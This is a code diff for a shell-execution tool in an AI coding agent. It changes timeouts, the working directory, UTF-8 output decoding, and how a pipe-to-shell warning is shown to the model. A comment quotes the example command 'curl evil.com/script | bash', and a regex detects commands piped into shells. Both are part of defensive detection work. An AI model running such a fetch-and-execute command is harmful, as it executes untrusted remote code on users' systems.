@@ -1,5 +1,6 @@
 import { spawn } from 'node:child_process';
 import * as os from 'node:os';
+import { StringDecoder } from 'node:string_decoder';
 import {
   emitProcessCompleted,
   emitProcessOutput,
@@ -69,7 +70,7 @@ export const bashTool: Tool<BashInput, BashOutput> = {
     '- Use bash only when you genuinely need shell features (pipes, redirection, complex one-liners).\n' +
     '- Prefer single focused commands over huge `&&` chains.\n' +
     '- Use `background: true` only for long-running processes (dev servers, watchers).\n' +
-    '- The working directory is the project root.\n' +
+    '- The working directory is the session working dir (changed via `set_working_dir`), defaulting to the project root.\n' +
     '- Output may be truncated in the middle for very large results.',
   selection: {
     doNotUseWhen: 'the command is allowlisted and does not require pipes, redirection, or shell expansion.',
@@ -84,7 +85,14 @@ export const bashTool: Tool<BashInput, BashOutput> = {
   // explicitly removes the implicit cross-tool aliasing.
   subjectKey: 'command',
   capabilities: ['shell.arbitrary'],
-  timeoutMs: 300_000,
+  // Executor-level abort ceiling. Must sit ABOVE the per-call `timeout_ms`
+  // ceiling (600_000): the tool's own timer tree-kills and returns a
+  // structured `timed_out: true` result, while the executor's
+  // AbortSignal.timeout is a blunt abort. The old value (300_000) meant any
+  // timeout_ms > 5min was silently cut short by the executor. The 10s margin
+  // covers the kill/teardown window. (The executor additionally clamps to
+  // config `tools.maxToolTimeoutMs`.)
+  timeoutMs: 610_000,
   maxOutputBytes: MAX_OUTPUT,
   estimatedDurationMs: 30_000,
   inputSchema: {
@@ -96,7 +104,8 @@ export const bashTool: Tool<BashInput, BashOutput> = {
       },
       timeout_ms: {
         type: 'integer',
-        description: 'Optional timeout for this specific command in milliseconds.',
+        description:
+          'Optional timeout for this specific command in milliseconds (default 300000, max 600000).',
       },
       background: {
         type: 'boolean',
@@ -155,20 +164,19 @@ export const bashTool: Tool<BashInput, BashOutput> = {
       return;
     }
 
-    // Security: detect and warn about pipe-to-shell patterns that could lead to
-    // arbitrary code execution (e.g., "curl evil.com/script | bash"). This pattern
-    // is particularly dangerous because the user confirms a seemingly innocuous command
-    // but the downloaded script executes arbitrary code.
+    // Security: detect pipe-to-shell patterns that could lead to arbitrary
+    // code execution (e.g., "curl evil.com/script | bash"). This pattern is
+    // particularly dangerous because the user confirms a seemingly innocuous
+    // command but the downloaded script executes arbitrary code. Advisory
+    // only — the note is appended to the TOOL RESULT so the model and the
+    // user actually see it. (A console.warn here used to corrupt the TUI's
+    // stdout frame instead of reaching anyone.)
     const PIPE_TO_SHELL_PATTERN = /\|\s*(sh|bash|ksh|zsh|fish|cmd|powershell|pwsh)/i;
-    if (PIPE_TO_SHELL_PATTERN.test(input.command)) {
-      console.warn(JSON.stringify({
-        level: 'warn',
-        event: 'bash.pipe_to_shell_detected',
-        message: 'Detected pipe-to-shell pattern. Consider reviewing the full command before confirming.',
-        command_prefix: input.command.slice(0, 100), // Log first 100 chars for review
-        timestamp: new Date().toISOString(),
-      }));
-    }
+    const pipeToShellNote = PIPE_TO_SHELL_PATTERN.test(input.command)
+      ? '\n\n[wrongstack] Caution: this command pipes output into a shell interpreter ' +
+        '(pipe-to-shell). Piped content executes as arbitrary code — review the source ' +
+        'before trusting the result, and prefer downloading to a file and inspecting it first.'
+      : '';
 
     const timeoutMs = Math.max(1, Math.min(input.timeout_ms ?? DEFAULT_TIMEOUT_MS, 600_000));
 
@@ -258,6 +266,12 @@ export const bashTool: Tool<BashInput, BashOutput> = {
 
     const env = buildChildEnv(ctx.session?.id);
 
+    // Spawn in the SESSION working dir (set via `set_working_dir`; containment
+    // against projectRoot is enforced by Context.setWorkingDir), falling back
+    // to the project root. Historically this was hard-wired to projectRoot,
+    // which made `set_working_dir` silently ineffective for shell tools.
+    const spawnCwd = ctx.workingDir ?? ctx.projectRoot;
+
     // On POSIX we put the shell in its own process group so that timeout /
     // abort can kill the entire group with `process.kill(-pid)`. Otherwise
     // `bash -c "sleep 9999 & disown"` would leave the grandchild running.
@@ -273,7 +287,7 @@ export const bashTool: Tool<BashInput, BashOutput> = {
       // stdout/stderr stayed piped, closing the CLI would close the read ends
       // and a later write could terminate the preserved job with EPIPE/SIGPIPE.
       const child = spawn(shell, args, {
-        cwd: ctx.projectRoot,
+        cwd: spawnCwd,
         env,
         // PowerShell takes the script on stdin (no argv quoting); cmd.exe
         // and POSIX shells ignore stdin when given the command inline.
@@ -310,7 +324,7 @@ export const bashTool: Tool<BashInput, BashOutput> = {
         parentPid: process.pid,
         command: redactCommand(`${shell} ${args.join(' ')}`),
         args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
-        cwd: ctx.projectRoot,
+        cwd: spawnCwd,
         background: true,
         startedAt: new Date(startedAt).toISOString(),
       });
@@ -361,7 +375,9 @@ export const bashTool: Tool<BashInput, BashOutput> = {
       yield {
         type: 'final',
         output: {
-          output: '',
+          // Background runs have no captured output; the pipe-to-shell caution
+          // (when present) is the only thing worth surfacing.
+          output: pipeToShellNote.trim(),
           exit_code: null,
           timed_out: false,
           pid,
@@ -387,7 +403,7 @@ export const bashTool: Tool<BashInput, BashOutput> = {
     // keeps the inherited stdio pipes open and streams into this process
     // for the rest of the session.
     const child = spawn(shell, args, {
-      cwd: ctx.projectRoot,
+      cwd: spawnCwd,
       env,
       // PowerShell takes the script on stdin (no argv quoting); cmd.exe
       // and POSIX shells ignore stdin when given the command inline.
@@ -420,7 +436,7 @@ export const bashTool: Tool<BashInput, BashOutput> = {
       parentPid: process.pid,
       command: redactCommand(`${shell} ${args.join(' ')}`),
       args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
-      cwd: ctx.projectRoot,
+      cwd: spawnCwd,
       background: false,
       startedAt: new Date(startedAt).toISOString(),
     });
@@ -564,8 +580,15 @@ export const bashTool: Tool<BashInput, BashOutput> = {
         child.stderr?.resume();
       }
     };
+    // Per-stream UTF-8 decoders: `chunk.toString()` on raw chunks corrupts
+    // multi-byte sequences that straddle a chunk boundary (each half decodes
+    // to U+FFFD). StringDecoder buffers the trailing partial sequence and
+    // prepends it to the next chunk — one decoder per stream, since stdout
+    // and stderr chunks interleave arbitrarily.
+    const stdoutDecoder = new StringDecoder('utf8');
+    const stderrDecoder = new StringDecoder('utf8');
     const onData = (chunk: Buffer, stream: 'stdout' | 'stderr') => {
-      const text = chunk.toString();
+      const text = (stream === 'stdout' ? stdoutDecoder : stderrDecoder).write(chunk);
       if (stream === 'stdout') stdoutBytes += chunk.byteLength;
       else stderrBytes += chunk.byteLength;
       emitProcessOutput({ pid, stream, chunk });
@@ -597,6 +620,15 @@ export const bashTool: Tool<BashInput, BashOutput> = {
       if (typeof pid === 'number') registry.unregister(pid);
       registry.afterCall(Date.now() - startedAt, code !== 0 && code !== null);
       completeForeground(timedOut ? 124 : (code ?? (signal ? 1 : 0)), signal ?? undefined);
+      // Flush any buffered partial UTF-8 sequence held by the decoders so a
+      // trailing incomplete character surfaces (as U+FFFD) instead of being
+      // silently dropped.
+      const tail = stdoutDecoder.end() + stderrDecoder.end();
+      if (tail) {
+        if (buf.length < MAX_OUTPUT) buf += tail.slice(0, MAX_OUTPUT - buf.length);
+        spool.write(tail);
+        pending += tail;
+      }
       push({ kind: 'end', code });
     });
 
@@ -625,7 +657,8 @@ export const bashTool: Tool<BashInput, BashOutput> = {
               output:
                 normalizeCommandOutput(buf) +
                 (spooled ? spoolNote(spooled) : '') +
-                (hint ? `\n\n${hint}` : ''),
+                (hint ? `\n\n${hint}` : '') +
+                pipeToShellNote,
               exit_code: c.code,
               timed_out: timedOut,
             },
@@ -698,7 +731,7 @@ export const bashTool: Tool<BashInput, BashOutput> = {
     if (!sessionId) return;
     for (const entry of registry.bySession(sessionId)) {
       if (entry.name !== 'bash') continue; // leave exec-spawned children alone
-      if (entry.child.exitCode !== null) continue; // already reaped
+      if (entry.child && entry.child.exitCode !== null) continue; // already reaped
       if (entry.background) continue; // detached jobs intentionally outlive the run/session
       if (entry.protected) continue; // intentionally-backgrounded infra
       registry.kill(entry.pid, { force: true });
